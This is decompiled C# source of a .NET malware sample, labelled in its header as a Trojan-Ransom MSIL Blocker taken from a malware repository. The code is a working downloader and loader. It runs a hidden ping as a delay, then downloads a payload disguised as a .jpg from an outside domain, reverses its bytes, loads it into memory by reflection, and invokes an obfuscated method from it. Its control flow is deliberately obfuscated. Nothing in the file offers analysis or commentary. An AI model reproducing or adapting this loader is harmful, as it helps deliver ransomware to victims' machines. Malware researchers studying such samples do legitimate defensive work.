// Decompiled with JetBrains decompiler
// Type: Psmvvft.HelperUtilsWrapper
// Assembly: Zgcrnhtf, Version=18.5.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 2C5B6DD9-C2C3-4254-821F-214527B6E341
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-b48650ba14beed7253f833936514a482d7905851317a45c19c424a0ef9ce8e4f.exe

using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;

namespace Psmvvft
{
  internal class HelperUtilsWrapper
  {
    private static HelperUtilsWrapper FillStub;

    internal static void MovePool()
    {
      try
      {
        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
      }
      catch
      {
      }
      Process.Start(new ProcessStartInfo()
      {
        FileName = "cmd",
        Arguments = "/c ping yahoo.com",
        WindowStyle = ProcessWindowStyle.Hidden
      });
      Thread.Sleep(TimeSpan.FromSeconds(20.0));
    }

    internal static void ReflectPool()
    {
      AppDomain target = (AppDomain) typeof (AppDomain).GetProperty("CurrentDomain").GetValue((object) null, (object[]) null);
      Assembly assembly = (Assembly) HelperUtilsWrapper.PushStub((object) target).InvokeMember("Load", BindingFlags.InvokeMethod, (Binder) null, (object) target, new object[1]
      {
        (object) HelperUtilsWrapper.SortPool()
      });
    }

    [SpecialName]
    internal static byte[] SortPool()
    {
      byte[] numArray = new BinaryReader(WebRequest.Create("https://kotadiainc.com/Zgcrnhtf.jpg").GetResponse().GetResponseStream()).ReadBytes(84621640);
      // ISSUE: type reference
      // ISSUE: explicit non-virtual call
      __nonvirtual (HelperUtilsWrapper.ConnectStub(__typeref (Array)).GetMethod("Reverse", new Type[1]
      {
        typeof (Array)
      })).Invoke((object) null, new object[1]
      {
        (object) numArray
      });
      return numArray;
    }

    internal static bool CallPool()
    {
      int num = 1;
      while (true)
      {
        Assembly[] assemblies;
        int index1;
        int index2;
        Type type;
        switch (num)
        {
          case 1:
            assemblies = ((AppDomain) HelperUtilsWrapper.DestroyStub()).GetAssemblies();
            num = \u003CModule\u003E\u007B52fd7bfb\u002D0a36\u002D447c\u002Da8c9\u002Dfb0e861d2b11\u007D.m_231a87dfe521496abb6af32aec6abfa7.m_7fabd0559c0844c1bec8571b76f15e1d != 0 ? 0 : 0;
            continue;
          case 2:
            foreach (MethodInfo method in type.GetMethods())
            {
              if (method.Name == "Mbonuctkwvqgaqlghmzb")
                return (bool) method.Invoke((object) null, (object[]) null);
            }
            ++index2;
            break;
          default:
            index1 = 0;
            goto label_10;
        }
label_7:
        Type[] types;
        if (index2 < types.Length)
        {
          type = types[index2];
          num = \u003CModule\u003E\u007B52fd7bfb\u002D0a36\u002D447c\u002Da8c9\u002Dfb0e861d2b11\u007D.m_231a87dfe521496abb6af32aec6abfa7.m_b4c9b60dbec5463b934315cfc96c24fd == 0 ? 2 : 2;
          continue;
        }
        ++index1;
label_10:
        if (index1 < assemblies.Length)
        {
          types = assemblies[index1].GetTypes();
          index2 = 0;
          goto label_7;
        }
        else
          break;
      }
      return false;
    }

    internal static bool UpdateStub() => HelperUtilsWrapper.FillStub == null;

    internal static HelperUtilsWrapper MapStub() => HelperUtilsWrapper.FillStub;

    internal static Type PushStub([In] object obj0) => ((AppDomain) obj0).GetType();

    internal static Type ConnectStub([In] RuntimeTypeHandle obj0) => Type.GetTypeFromHandle(obj0);

    internal static object DestroyStub() => (object) AppDomain.CurrentDomain;
  }
}
